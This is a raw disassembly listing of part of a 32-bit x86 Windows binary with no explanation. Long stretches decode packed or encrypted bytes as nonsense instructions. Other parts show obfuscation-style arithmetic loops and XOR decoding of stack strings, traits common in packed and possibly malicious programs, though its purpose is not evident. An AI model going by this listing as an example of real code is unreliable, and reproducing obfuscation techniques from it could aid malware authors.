  41c7bd:	pushf  
  41c7be:	ret    
  41c7bf:	icebp  
  41c7c0:	retf   
  41c7c1:	das    
  41c7c2:	mov    al,0x69
  41c7c4:	adc    dl,BYTE PTR [esi-0x2d01e6dc]
  41c7ca:	jle    0x41c837
  41c7cc:	fst    st(4)
  41c7ce:	xlat   BYTE PTR ds:[ebx]
  41c7cf:	into   
  41c7d0:	pop    ebp
  41c7d1:	hlt    
  41c7d2:	sub    BYTE PTR [ebx],dl
  41c7d4:	pusha  
  41c7d5:	jnp    0x41c780
  41c7d7:	push   es
  41c7d8:	arpl   WORD PTR [ecx],ax
  41c7da:	(bad)
  41c7dd:	jmp    0x252b:0x15914897
  41c7e4:	push   edx
  41c7e5:	dec    esi
  41c7e6:	mov    edx,0xd9161e73
  41c7eb:	and    BYTE PTR [esp+edx*8+0x46bfdf2f],dh
  41c7f2:	and    ah,dh
  41c7f4:	in     al,dx
  41c7f5:	fisub  WORD PTR [edi+0x3d]
  41c7f8:	mov    edx,0x1b3c4ca6
  41c7fd:	dec    edx
  41c7fe:	push   esp
  41c7ff:	sbb    ebp,DWORD PTR [edi-0x79cfa793]
  41c805:	stos   DWORD PTR es:[edi],eax
  41c806:	sbb    al,0x57
  41c808:	sbb    DWORD PTR [ecx+ecx*4-0xcf6b7b9],0xffffffee
  41c810:	hlt    
  41c811:	xchg   DWORD PTR [ebp+0x2e3d45b2],ebx
  41c817:	dec    edi
  41c818:	and    ch,BYTE PTR [edx+0x48]
  41c81b:	dec    ecx
  41c81c:	cmp    eax,0xba1cecf3
  41c821:	retf   
  41c822:	adc    DWORD PTR [edx+0x77],ebp
  41c825:	adc    DWORD PTR ds:0x1191ad,esi
  41c82b:	repz test eax,0x30556da9
  41c831:	jnp    0x41c824
  41c833:	ror    DWORD PTR [edi],0xd3
  41c836:	cli    
  41c837:	jbe    0x41c85b
  41c839:	sti    
  41c83a:	fcomp  QWORD PTR [esi+0x522ca45]
  41c840:	rcr    BYTE PTR ds:0x26f083d0,0x77
  41c847:	stc    
  41c848:	(bad)  
  41c84a:	mov    WORD PTR [ebp+0x72fcf416],?
  41c850:	xchg   DWORD PTR [edx+0x2],ebx
  41c853:	out    0x4a,eax
  41c855:	jecxz  0x41c821
  41c857:	mov    dh,0x7d
  41c859:	imul   edi,DWORD PTR [ebx-0x1b9f874b],0x30b6ee7b
  41c863:	mov    es,WORD PTR [ebx-0x3ff3dbc6]
  41c869:	enter  0x56ad,0x9
  41c86d:	sti    
  41c86e:	arpl   WORD PTR [ebx+0x186e0173],ax
  41c874:	fldenv [ebp+0x467071e2]
  41c87a:	inc    ebx
  41c87b:	push   cs
  41c87c:	loop   0x41c865
  41c87e:	push   0x18
  41c880:	call   0xd8bd:0xefa7001f
  41c887:	sub    DWORD PTR [edi+0x1f],esi
  41c88a:	inc    edx
  41c88b:	out    dx,eax
  41c88c:	mov    edi,0xa3ef925d
  41c891:	loope  0x41c8c7
  41c893:	mov    WORD PTR [eax-0x3e],fs
  41c896:	pop    ds
  41c897:	fs xchg ecx,eax
  41c899:	iret   
  41c89a:	outs   dx,DWORD PTR ds:[esi]
  41c89b:	fisubr WORD PTR [esi]
  41c89d:	cwde   
  41c89e:	jno    0x41c8bb
  41c8a0:	push   esp
  41c8a1:	xchg   edi,eax
  41c8a2:	jle    0x41c877
  41c8a4:	push   0x46cf5861
  41c8a9:	je     0x41c91f
  41c8ab:	(bad)  
  41c8ac:	mov    bh,0xa8
  41c8ae:	lea    ebx,[esi+0x6f2a120e]
  41c8b4:	fxch   st(7)
  41c8b6:	fucomp st(7)
  41c8b8:	outs   dx,DWORD PTR ds:[esi]
  41c8b9:	retf   
  41c8ba:	in     al,dx
  41c8bb:	out    dx,al
  41c8bc:	mov    bl,0x3b
  41c8be:	aad    0x9f
  41c8c0:	mov    dh,0x75
  41c8c2:	fs std 
  41c8c4:	jecxz  0x41c8a2
  41c8c6:	imul   eax,esi,0xffffff83
  41c8c9:	rcl    al,1
  41c8cb:	out    0x30,al
  41c8cd:	mov    eax,0x66602389
  41c8d2:	lahf   
  41c8d3:	ret    0x5300
  41c8d6:	adc    DWORD PTR [ebx+0x919af78],esp
  41c8dc:	mov    al,0x9a
  41c8de:	sub    eax,0x7ca1b3c8
  41c8e3:	add    esi,edi
  41c8e5:	xchg   edx,eax
  41c8e6:	pop    ebp
  41c8e7:	mov    dl,0x86
  41c8e9:	mov    ebp,0x6eaf7bb1
  41c8ee:	xor    al,BYTE PTR [esi-0x57]
  41c8f1:	jmp    0x41c875
  41c8f3:	shl    DWORD PTR [eax-0x5c],cl
  41c8f6:	jae    0x41c932
  41c8f8:	add    BYTE PTR [ecx+ebp*2-0x24d13849],ch
  41c8ff:	sub    bh,BYTE PTR [edx-0x46]
  41c902:	inc    esp
  41c903:	arpl   WORD PTR [ebp+0x71],sp
  41c906:	dec    esp
  41c907:	in     al,0x63
  41c909:	test   esp,0xf2703bdd
  41c90f:	inc    ebp
  41c910:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c911:	xor    al,0x46
  41c913:	shr    dh,0xc8
  41c916:	inc    esi
  41c917:	es aas 
  41c919:	ins    BYTE PTR es:[edi],dx
  41c91a:	jg     0x41c975
  41c91c:	mov    dl,0xbd
  41c91e:	xor    ecx,DWORD PTR [edi]
  41c920:	cmp    ecx,DWORD PTR [ebx+0x192b7628]
  41c926:	push   edi
  41c927:	pop    edi
  41c928:	pop    es
  41c929:	dec    ecx
  41c92a:	lock dec esp
  41c92c:	mov    edx,0x1e955036
  41c931:	cmc    
  41c932:	jg     0x41c9ab
  41c934:	cmp    al,0xf0
  41c936:	repz pushf 
  41c938:	test   eax,0xf8286b1c
  41c93d:	add    al,0xce
  41c93f:	nop
  41c940:	out    dx,eax
  41c941:	dec    eax
  41c942:	std    
  41c943:	xchg   edi,eax
  41c944:	arpl   WORD PTR [ebx+0x75a0fc36],dx
  41c94a:	std    
  41c94b:	jbe    0x41c965
  41c94d:	sub    bl,BYTE PTR [esi+0x25]
  41c950:	les    esp,FWORD PTR [eax]
  41c952:	jg     0x41c92f
  41c954:	mov    bl,0x3d
  41c956:	xchg   DWORD PTR [esi-0x46],esp
  41c959:	sar    BYTE PTR [edi+0x5c2f129c],0x3a
  41c960:	pop    ebp
  41c961:	inc    edx
  41c962:	(bad)  [edx+0x7f]
  41c965:	daa    
  41c966:	cmp    edx,DWORD PTR [eax-0x2f2fa76e]
  41c96c:	imul   esi,edx,0x5e
  41c96f:	cdq    
  41c970:	jns    0x41c95d
  41c972:	pop    ebx
  41c973:	adc    al,0x8
  41c975:	mov    edx,0x15b90160
  41c97a:	dec    edi
  41c97b:	pusha  
  41c97c:	xchg   edx,eax
  41c97d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c97e:	pop    edx
  41c97f:	fsub   QWORD PTR [eax+0x7bdced53]
  41c985:	dec    ebx
  41c986:	sahf   
  41c987:	sub    al,0x41
  41c989:	mov    es,esi
  41c98b:	cmp    al,0xed
  41c98d:	sbb    bh,ch
  41c98f:	and    eax,0xd6c6cd4c
  41c994:	bound  eax,QWORD PTR [edi-0x677c38]
  41c99a:	call   0x1de8d90a
  41c99f:	jmp    0x41c92f
  41c9a1:	cld    
  41c9a2:	sbb    al,0xac
  41c9a4:	not    BYTE PTR [esi+0x34]
  41c9a7:	ret    0xf226
  41c9aa:	push   ebp
  41c9ab:	sub    BYTE PTR [ebx-0x212dae72],dl
  41c9b1:	dec    eax
  41c9b2:	jp     0x41ca07
  41c9b4:	add    eax,0x53025cf7
  41c9b9:	push   ebp
  41c9ba:	pop    edx
  41c9bb:	fnsave ds:0xef3e970b
  41c9c1:	ja     0x41ca2a
  41c9c3:	jmp    0x5843:0xd4a5decc
  41c9ca:	(bad)  
  41c9cb:	or     eax,0x45de49e6
  41c9d0:	(bad)
  41c9d3:	and    eax,0x97a25565
  41c9d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c9d9:	mov    ebp,0x49c37bc
  41c9de:	push   edx
  41c9df:	xchg   edx,eax
  41c9e0:	push   0xffffff9a
  41c9e2:	loopne 0x41c9da
  41c9e4:	cdq    
  41c9e5:	jne    0x41ca55
  41c9e7:	xchg   edx,eax
  41c9e8:	mov    esp,0xf6ff510c
  41c9ed:	or     eax,esi
  41c9ef:	lea    edx,[ebx-0x67]
  41c9f2:	push   ecx
  41c9f3:	arpl   WORD PTR [ebp+esi*1-0x4cc7478f],dx
  41c9fa:	cmp    al,0xad
  41c9fc:	fchs   
  41c9fe:	adc    eax,0x3ac932fe
  41ca03:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  41ca05:	sub    al,0xde
  41ca07:	stc    
  41ca08:	or     BYTE PTR [esi+0x4e],cl
  41ca0b:	push   0xffffffc0
  41ca0d:	retf   
  41ca0e:	mov    eax,ds:0xefb48c32
  41ca13:	pushf  
  41ca14:	and    DWORD PTR [edx-0x40],eax
  41ca17:	mov    ecx,DWORD PTR [eiz*8+0x480fc9e6]
  41ca1e:	jmp    DWORD PTR [ebp+0x35]
  41ca21:	mov    WORD PTR [ebp-0x46],fs
  41ca24:	pushf  
  41ca25:	or     cl,BYTE PTR [ecx-0x5b]
  41ca28:	xor    al,0x69
  41ca2a:	ds mov eax,0x6962bff1
  41ca30:	das    
  41ca31:	sbb    eax,0x9684a893
  41ca36:	mov    ebp,?
  41ca38:	out    dx,eax
  41ca39:	rcl    DWORD PTR [ecx],cl
  41ca3b:	mov    bl,0x36
  41ca3d:	push   edi
  41ca3e:	icebp  
  41ca3f:	push   0xaadbb39b
  41ca44:	mov    eax,0xd216b3ca
  41ca49:	test   BYTE PTR [edi-0x40],bl
  41ca4c:	loope  0x41ca0d
  41ca4e:	mov    dl,0x8e
  41ca50:	mov    dh,0x2a
  41ca52:	mov    esp,0x49716f54
  41ca57:	and    eax,0x15670cfb
  41ca5c:	ror    DWORD PTR [ecx+ebp*2],1
  41ca5f:	out    dx,al
  41ca60:	push   ecx
  41ca61:	rcr    cl,0x8
  41ca64:	out    dx,al
  41ca65:	in     al,dx
  41ca66:	pop    eax
  41ca67:	cdq    
  41ca68:	sub    al,0xeb
  41ca6a:	jg     0x41caae
  41ca6c:	lds    esi,FWORD PTR [ecx+0x9]
  41ca6f:	int    0xfa
  41ca71:	nop
  41ca72:	push   edi
  41ca73:	inc    esp
  41ca74:	(bad)  
  41ca76:	rcr    ah,1
  41ca78:	sbb    eax,0x89681f04
  41ca7d:	jmp    0xa005:0xa299d2a8
  41ca84:	fisub  DWORD PTR [ecx+0x15]
  41ca87:	cli    
  41ca88:	push   es
  41ca89:	test   eax,0x62f8b00e
  41ca8e:	sub    bh,BYTE PTR [eax]
  41ca90:	mov    dh,0xe7
  41ca93:	idiv   BYTE PTR [ebx-0x2347f483]
  41ca99:	lds    esi,FWORD PTR [ebp+0x2cd6d5ed]
  41ca9f:	pop    ebx
  41caa0:	loope  0x41cb02
  41caa2:	xchg   esp,eax
  41caa3:	mov    eax,DWORD PTR [esi-0x55]
  41caa6:	jbe    0x41cab5
  41caa8:	jae    0x41cad8
  41caaa:	rol    BYTE PTR [bp+si+0x26],cl
  41caae:	inc    esi
  41caaf:	test   al,0xd3
  41cab1:	lods   eax,DWORD PTR ds:[esi]
  41cab2:	retf   
  41cab3:	mov    esp,0x43a7d78e
  41cab8:	jo     0x41cb2e
  41caba:	imul   ebx,DWORD PTR [esi+esi*1-0x7b7439a2],0x21dfeb7c
  41cac5:	cmp    ebp,esp
  41cac7:	pop    edi
  41cac8:	pop    ecx
  41cac9:	ins    BYTE PTR es:[edi],dx
  41caca:	jg     0x41caba
  41cacc:	mov    ds:0x84f03c17,al
  41cad1:	data16 ds jge 0x41ca73
  41cad5:	faddp  st(0),st
  41cad7:	repnz xchg ebx,eax
  41cad9:	mov    DWORD PTR [ebx-0x2411b1c2],esp
  41cadf:	scas   al,BYTE PTR es:[edi]
  41cae0:	es (bad) 
  41cae2:	icebp  
  41cae3:	add    ecx,DWORD PTR [esi+0x19ea08f3]
  41cae9:	ins    BYTE PTR es:[edi],dx
  41caea:	(bad)  
  41caeb:	shl    BYTE PTR [ebp+0x2422cfef],1
  41caf1:	jbe    0x41cac6
  41caf3:	out    0xf8,eax
  41caf5:	fst    DWORD PTR [eax-0x19]
  41caf8:	sbb    bh,bh
  41cafa:	and    ecx,DWORD PTR [edx+0x5f]
  41cafd:	and    al,0x32
  41caff:	rcr    DWORD PTR [esi-0x6f],cl
  41cb02:	mov    eax,ds:0x1eaf2764
  41cb07:	jge    0x41cb29
  41cb09:	adc    eax,0xa7a3e98a
  41cb0e:	push   esi
  41cb0f:	mov    dl,0xc1
  41cb11:	or     ch,BYTE PTR [ebp+0x51]
  41cb14:	mov    ch,0x9
  41cb16:	mov    ss,WORD PTR [eax]
  41cb18:	out    dx,eax
  41cb19:	and    ecx,DWORD PTR [eax+0x64]
  41cb1c:	sub    DWORD PTR [esi+0x6e],esp
  41cb1f:	(bad)  
  41cb20:	sahf   
  41cb21:	stos   DWORD PTR es:[edi],eax
  41cb22:	into   
  41cb23:	dec    ebp
  41cb24:	daa    
  41cb25:	dec    ebp
  41cb26:	mov    ds,esp
  41cb28:	cmp    al,0xc7
  41cb2a:	stc    
  41cb2b:	ins    BYTE PTR es:[edi],dx
  41cb2c:	pushf  
  41cb2d:	outs   dx,BYTE PTR ds:[esi]
  41cb2e:	repnz clc 
  41cb30:	or     eax,0x1d05c26e
  41cb35:	mov    ebx,0x87e0cd0c
  41cb3a:	call   0xfe5edb46
  41cb3f:	xor    al,0x4c
  41cb41:	test   al,0x8e
  41cb43:	sub    DWORD PTR [eax-0x4],ebp
  41cb46:	add    al,0xb0
  41cb48:	pusha  
  41cb49:	add    bh,BYTE PTR [eax+0x30]
  41cb4c:	push   ds
  41cb4d:	push   es
  41cb4e:	rep outs dx,DWORD PTR ds:[esi]
  41cb50:	imul   esp,esi,0xacee0c30
  41cb56:	mov    eax,0xfdd7b61e
  41cb5b:	xor    BYTE PTR [edx],0x2c
  41cb5e:	ret    
  41cb5f:	mov    ebp,0xd323f5bf
  41cb64:	mov    DWORD PTR [ebp-0x4c],edx
  41cb67:	mov    edx,DWORD PTR [ebp+0x8]
  41cb6a:	mov    ebx,DWORD PTR [ebp-0x48]
  41cb6d:	lea    edx,[ebx+edx*1+0x241fc1f]
  41cb74:	mov    DWORD PTR [ebp-0x48],edx
  41cb77:	mov    edx,DWORD PTR [ebp+0x8]
  41cb7a:	mov    ebx,0xfa5e15e2
  41cb7f:	sub    ebx,edx
  41cb81:	add    ebx,DWORD PTR [ebp-0x44]
  41cb84:	mov    DWORD PTR [ebp-0x44],ebx
  41cb87:	mov    edx,DWORD PTR [ebp+0x8]
  41cb8a:	xor    edx,eax
  41cb8c:	add    edx,esi
  41cb8e:	jne    0x41a7ce
  41cb94:	mov    edx,DWORD PTR [ebp-0x14]
  41cb97:	mov    DWORD PTR [ebp+0x8],edx
  41cb9a:	jmp    0x41cc0f
  41cb9f:	mov    edx,DWORD PTR [ebp+0x8]
  41cba2:	mov    ebx,DWORD PTR [ebp-0x8]
  41cba5:	xor    edx,eax
  41cba7:	xor    ebx,eax
  41cba9:	sub    edx,ebx
  41cbab:	sub    edx,esi
  41cbad:	xor    edx,eax
  41cbaf:	mov    DWORD PTR [ebp+0x8],edx
  41cbb2:	mov    edx,DWORD PTR [ebp+0x8]
  41cbb5:	mov    ebx,DWORD PTR [ebp-0x58]
  41cbb8:	add    edx,0x5708c4
  41cbbe:	imul   edx,ebx
  41cbc1:	mov    DWORD PTR [ebp-0x58],edx
  41cbc4:	mov    edx,DWORD PTR [ebp+0x8]
  41cbc7:	mov    ebx,DWORD PTR [ebp-0x54]
  41cbca:	add    edx,0x64f8da
  41cbd0:	or     edx,ebx
  41cbd2:	mov    DWORD PTR [ebp-0x54],edx
  41cbd5:	mov    edx,DWORD PTR [ebp+0x8]
  41cbd8:	mov    ebx,DWORD PTR [ebp-0x50]
  41cbdb:	add    edx,ecx
  41cbdd:	xor    edx,ebx
  41cbdf:	mov    DWORD PTR [ebp-0x50],edx
  41cbe2:	mov    edx,DWORD PTR [ebp+0x8]
  41cbe5:	mov    ebx,DWORD PTR [ebp-0x4c]
  41cbe8:	add    edx,edi
  41cbea:	and    edx,ebx
  41cbec:	mov    DWORD PTR [ebp-0x4c],edx
  41cbef:	mov    edx,DWORD PTR [ebp+0x8]
  41cbf2:	mov    ebx,DWORD PTR [ebp-0x48]
  41cbf5:	lea    edx,[ebx+edx*1+0x241fc1f]
  41cbfc:	mov    DWORD PTR [ebp-0x48],edx
  41cbff:	mov    edx,DWORD PTR [ebp+0x8]
  41cc02:	mov    ebx,0xfa5e15e2
  41cc07:	sub    ebx,edx
  41cc09:	add    ebx,DWORD PTR [ebp-0x44]
  41cc0c:	mov    DWORD PTR [ebp-0x44],ebx
  41cc0f:	mov    edx,DWORD PTR [ebp+0x8]
  41cc12:	xor    edx,eax
  41cc14:	add    edx,esi
  41cc16:	jne    0x41cb9f
  41cc1c:	mov    edx,DWORD PTR [ebp-0x8]
  41cc1f:	mov    ebx,DWORD PTR [ebp-0xc]
  41cc22:	xor    edx,eax
  41cc24:	lea    edx,[edx+ebx*1+0x3272e2]
  41cc2b:	mov    DWORD PTR [ebp-0xc],edx
  41cc2e:	mov    edx,DWORD PTR [ebp-0x10]
  41cc31:	xor    edx,eax
  41cc33:	add    edx,esi
  41cc35:	jne    0x413baf
  41cc3b:	jmp    0x41cd52
  41cc40:	mov    ecx,DWORD PTR [ebp-0x14]
  41cc43:	mov    DWORD PTR [ebp+0x8],ecx
  41cc46:	jmp    0x41ccbf
  41cc4b:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc4e:	mov    edx,DWORD PTR [ebp-0x8]
  41cc51:	xor    ecx,eax
  41cc53:	xor    edx,eax
  41cc55:	sub    ecx,edx
  41cc57:	sub    ecx,esi
  41cc59:	xor    ecx,eax
  41cc5b:	mov    DWORD PTR [ebp+0x8],ecx
  41cc5e:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc61:	mov    edx,DWORD PTR [ebp-0x58]
  41cc64:	add    ecx,0x5708c4
  41cc6a:	imul   ecx,edx
  41cc6d:	mov    DWORD PTR [ebp-0x58],ecx
  41cc70:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc73:	mov    edx,DWORD PTR [ebp-0x54]
  41cc76:	add    ecx,0x64f8da
  41cc7c:	or     ecx,edx
  41cc7e:	mov    DWORD PTR [ebp-0x54],ecx
  41cc81:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc84:	mov    edx,DWORD PTR [ebp-0x50]
  41cc87:	add    ecx,0x242ebe9
  41cc8d:	xor    ecx,edx
  41cc8f:	mov    DWORD PTR [ebp-0x50],ecx
  41cc92:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc95:	mov    edx,DWORD PTR [ebp-0x4c]
  41cc98:	add    ecx,edi
  41cc9a:	and    ecx,edx
  41cc9c:	mov    DWORD PTR [ebp-0x4c],ecx
  41cc9f:	mov    ecx,DWORD PTR [ebp+0x8]
  41cca2:	mov    edx,DWORD PTR [ebp-0x48]
  41cca5:	lea    ecx,[edx+ecx*1+0x241fc1f]
  41ccac:	mov    DWORD PTR [ebp-0x48],ecx
  41ccaf:	mov    ecx,DWORD PTR [ebp+0x8]
  41ccb2:	mov    edx,0xfa5e15e2
  41ccb7:	sub    edx,ecx
  41ccb9:	add    edx,DWORD PTR [ebp-0x44]
  41ccbc:	mov    DWORD PTR [ebp-0x44],edx
  41ccbf:	mov    ecx,DWORD PTR [ebp+0x8]
  41ccc2:	xor    ecx,eax
  41ccc4:	add    ecx,esi
  41ccc6:	jne    0x41cc4b
  41cccc:	jmp    0x41cd5e
  41ccd1:	mov    ecx,DWORD PTR [ebp+0x8]
  41ccd4:	mov    edx,DWORD PTR [ebp-0x8]
  41ccd7:	xor    ecx,eax
  41ccd9:	xor    edx,eax
  41ccdb:	sub    ecx,edx
  41ccdd:	sub    ecx,esi
  41ccdf:	xor    ecx,eax
  41cce1:	mov    DWORD PTR [ebp+0x8],ecx
  41cce4:	mov    ecx,DWORD PTR [ebp+0x8]
  41cce7:	mov    edx,DWORD PTR [ebp-0x58]
  41ccea:	add    ecx,0x5708c4
  41ccf0:	imul   ecx,edx
  41ccf3:	mov    DWORD PTR [ebp-0x58],ecx
  41ccf6:	mov    ecx,DWORD PTR [ebp+0x8]
  41ccf9:	mov    edx,DWORD PTR [ebp-0x54]
  41ccfc:	add    ecx,0x64f8da
  41cd02:	or     ecx,edx
  41cd04:	mov    DWORD PTR [ebp-0x54],ecx
  41cd07:	mov    ecx,DWORD PTR [ebp+0x8]
  41cd0a:	mov    edx,DWORD PTR [ebp-0x50]
  41cd0d:	add    ecx,0x242ebe9
  41cd13:	xor    ecx,edx
  41cd15:	mov    DWORD PTR [ebp-0x50],ecx
  41cd18:	mov    ecx,DWORD PTR [ebp+0x8]
  41cd1b:	mov    edx,DWORD PTR [ebp-0x4c]
  41cd1e:	add    ecx,edi
  41cd20:	and    ecx,edx
  41cd22:	mov    DWORD PTR [ebp-0x4c],ecx
  41cd25:	mov    ecx,DWORD PTR [ebp+0x8]
  41cd28:	mov    edx,DWORD PTR [ebp-0x48]
  41cd2b:	lea    ecx,[edx+ecx*1+0x241fc1f]
  41cd32:	mov    DWORD PTR [ebp-0x48],ecx
  41cd35:	mov    ecx,DWORD PTR [ebp+0x8]
  41cd38:	mov    edx,0xfa5e15e2
  41cd3d:	sub    edx,ecx
  41cd3f:	add    edx,DWORD PTR [ebp-0x44]
  41cd42:	mov    DWORD PTR [ebp-0x44],edx
  41cd45:	mov    ecx,DWORD PTR [ebp+0x8]
  41cd48:	xor    ecx,eax
  41cd4a:	add    ecx,esi
  41cd4c:	jne    0x41ccd1
  41cd52:	mov    ecx,DWORD PTR [ebp-0x8]
  41cd55:	xor    ecx,eax
  41cd57:	mov    eax,DWORD PTR [ebp+0x10]
  41cd5a:	add    ecx,esi
  41cd5c:	mov    DWORD PTR [eax],ecx
  41cd5e:	pop    edi
  41cd5f:	pop    esi
  41cd60:	pop    ebx
  41cd61:	leave  
  41cd62:	ret    0xc
  41cd65:	add    BYTE PTR [eax-0x5ffbffbe],ah
  41cd6b:	inc    edx
  41cd6c:	add    BYTE PTR [eax],cl
  41cd6e:	mov    al,ds:0xa00c0042
  41cd73:	inc    edx
  41cd74:	add    BYTE PTR [eax],dl
  41cd76:	mov    al,ds:0xa0140042
  41cd7b:	inc    edx
  41cd7c:	add    BYTE PTR [eax],bl
  41cd7e:	mov    al,ds:0xa01c0042
  41cd83:	inc    edx
  41cd84:	add    BYTE PTR [eax],al
  41cd86:	rol    BYTE PTR [edx+0x0],1
  41cd89:	add    al,0xd0
  41cd8b:	inc    edx
  41cd8c:	add    BYTE PTR [eax],cl
  41cd8e:	rol    BYTE PTR [edx+0x0],1
  41cd91:	or     al,0xd0
  41cd93:	inc    edx
  41cd94:	add    BYTE PTR [eax],dl
  41cd96:	rol    BYTE PTR [edx+0x0],1
  41cd99:	adc    al,0xd0
  41cd9b:	inc    edx
  41cd9c:	add    BYTE PTR [eax],bl
  41cd9e:	rol    BYTE PTR [edx+0x0],1
  41cda1:	sbb    al,0xd0
  41cda3:	inc    edx
	...
  41cdb4:	rcr    esp,1
  41cdb6:	xor    BYTE PTR [ebp+0x0],cl
  41cdb9:	add    BYTE PTR [eax],al
  41cdbb:	add    BYTE PTR [edx],al
  41cdbd:	add    BYTE PTR [eax],al
  41cdbf:	add    BYTE PTR ds:0x40000000,bh
  41cdc5:	into   
  41cdc6:	add    DWORD PTR [eax],eax
  41cdc8:	inc    eax
  41cdc9:	ret    0x1
  41cdcc:	add    BYTE PTR [eax-0x6ffbffbe],dl
  41cdd2:	inc    edx
  41cdd3:	add    BYTE PTR [eax],cl
  41cdd5:	nop
  41cdd6:	inc    edx
  41cdd7:	add    BYTE PTR [eax+edx*4],cl
  41cdda:	inc    edx
  41cddb:	add    BYTE PTR [eax],dl
  41cddd:	nop
  41cdde:	inc    edx
  41cddf:	add    BYTE PTR [eax+edx*4],dl
  41cde2:	inc    edx
  41cde3:	add    BYTE PTR [eax],bl
  41cde5:	nop
  41cde6:	inc    edx
  41cde7:	add    BYTE PTR [eax+edx*4],bl
  41cdea:	inc    edx
  41cdeb:	add    BYTE PTR [eax],ah
  41cded:	nop
  41cdee:	inc    edx
  41cdef:	add    BYTE PTR [eax+edx*4],ah
  41cdf2:	inc    edx
  41cdf3:	add    BYTE PTR [eax],ch
  41cdf5:	nop
  41cdf6:	inc    edx
  41cdf7:	add    BYTE PTR [eax],al
  41cdf9:	mov    al,0x42
  41cdfb:	add    BYTE PTR [eax+esi*4],al
  41cdfe:	inc    edx
  41cdff:	add    BYTE PTR [eax],cl
  41ce01:	mov    al,0x42
  41ce03:	add    BYTE PTR [eax+esi*4],cl
  41ce06:	inc    edx
  41ce07:	add    BYTE PTR [eax],dl
  41ce09:	mov    al,0x42
  41ce0b:	add    BYTE PTR [eax+esi*4],dl
  41ce0e:	inc    edx
  41ce0f:	add    BYTE PTR [eax],bl
  41ce11:	mov    al,0x42
  41ce13:	add    BYTE PTR [eax+esi*4],bl
  41ce16:	inc    edx
  41ce17:	add    BYTE PTR [eax],al
  41ce19:	rol    BYTE PTR [edx+0x0],0x4
  41ce1d:	rol    BYTE PTR [edx+0x0],0x8
  41ce21:	rol    BYTE PTR [edx+0x0],0xc
  41ce25:	rol    BYTE PTR [edx+0x0],0x10
  41ce29:	rol    BYTE PTR [edx+0x0],0x14
  41ce2d:	rol    BYTE PTR [edx+0x0],0x18
  41ce31:	rol    BYTE PTR [edx+0x0],0x1c
  41ce35:	rol    BYTE PTR [edx+0x0],0x0
  41ce39:	add    BYTE PTR [eax],al
  41ce3b:	add    BYTE PTR [eax],al
  41ce3d:	add    BYTE PTR [eax],al
  41ce3f:	add    BYTE PTR [edx+0x53],dl
  41ce42:	inc    esp
  41ce43:	push   ebx
  41ce44:	repz add BYTE PTR [ebx],al
  41ce47:	pop    esp
  41ce48:	cmp    BYTE PTR [ebp-0x364dbdbd],ch
  41ce4e:	push   cs
  41ce4f:	ds xchg edx,eax
  41ce51:	sub    BYTE PTR [esp+eax*2],0x1
  41ce55:	add    BYTE PTR [eax],al
  41ce57:	add    BYTE PTR [ebx+0x3a],al
  41ce5a:	pop    esp
  41ce5b:	inc    ebx
  41ce5c:	jne    0x41ced0
  41ce5e:	jb     0x41cec5
  41ce60:	outs   dx,BYTE PTR ds:[esi]
  41ce61:	je     0x41cea7
  41ce63:	popa   
  41ce64:	je     0x41cec7
  41ce66:	pop    esp
  41ce67:	dec    ebp
  41ce68:	outs   dx,DWORD PTR ds:[esi]
  41ce69:	imul   esp,DWORD PTR fs:[esi+0x79],0x7070415c
  41ce71:	ins    BYTE PTR es:[edi],dx
  41ce72:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  41ce79:	dec    esi
  41ce7a:	gs ja  0x41ce7d
  41ce7d:	mov    edx,DWORD PTR [ebp-0x14]
  41ce80:	sub    esp,0xe4
  41ce86:	push   ebx
  41ce87:	push   edi
  41ce88:	mov    eax,ebx
  41ce8a:	xchg   ecx,eax
  41ce8b:	mov    eax,DWORD PTR [ebp+0x8]
  41ce8e:	mov    edi,0xf89c8585
  41ce93:	cmp    eax,edi
  41ce95:	jne    0x41d21d
  41ce9b:	mov    eax,DWORD PTR [ebp+0xc]
  41ce9e:	cmp    eax,0xf89c8584
  41cea3:	jne    0x41d21d
  41cea9:	mov    eax,DWORD PTR [ebp+0x24]
  41ceac:	mov    DWORD PTR [ebp-0x4],eax
  41ceaf:	mov    BYTE PTR [ebp-0x18],0x1b
  41ceb3:	mov    BYTE PTR [ebp-0x17],0x18
  41ceb7:	mov    BYTE PTR [ebp-0x16],0x5
  41cebb:	mov    BYTE PTR [ebp-0x15],0x4f
  41cebf:	mov    BYTE PTR [ebp-0x14],0x4e
  41cec3:	mov    BYTE PTR [ebp-0x13],0x7c
  41cec7:	mov    BYTE PTR [ebp-0x20],0x9
  41cecb:	mov    BYTE PTR [ebp-0x1f],0xf
  41cecf:	mov    BYTE PTR [ebp-0x1e],0x19
  41ced3:	mov    BYTE PTR [ebp-0x1d],0xe
  41ced7:	mov    BYTE PTR [ebp-0x1c],0x4f
  41cedb:	mov    BYTE PTR [ebp-0x1b],0x4e
  41cedf:	mov    BYTE PTR [ebp-0x1a],0x7c
  41cee3:	mov    BYTE PTR [ebp-0x28],0xf
  41cee7:	mov    BYTE PTR [ebp-0x27],0x4
  41ceeb:	mov    BYTE PTR [ebp-0x26],0x0
  41ceef:	mov    BYTE PTR [ebp-0x25],0xb
  41cef3:	push   esi
  41cef4:	mov    BYTE PTR [ebp-0x24],0x1d
  41cef8:	mov    BYTE PTR [ebp-0x23],0xc
  41cefc:	push   0x74
  41cefe:	mov    BYTE PTR [ebp-0x22],0x5
  41cf02:	mov    BYTE PTR [ebp-0x21],0x7c
  41cf06:	xor    esi,esi
  41cf08:	pop    edx
  41cf09:	mov    eax,0xf8
  41cf0e:	lea    ecx,[ebp+esi*1-0x18]
  41cf12:	movzx  ebx,BYTE PTR [ecx]
  41cf15:	xor    ebx,edx
  41cf17:	add    ebx,eax
  41cf19:	inc    esi
  41cf1a:	mov    BYTE PTR [ecx],bl
  41cf1c:	cmp    esi,0x6
  41cf1f:	jb     0x41cf0e
  41cf21:	xor    esi,esi
  41cf23:	lea    ecx,[ebp+esi*1-0x20]
  41cf27:	movzx  ebx,BYTE PTR [ecx]
  41cf2a:	xor    ebx,edx
  41cf2c:	add    ebx,eax
  41cf2e:	inc    esi
  41cf2f:	mov    BYTE PTR [ecx],bl
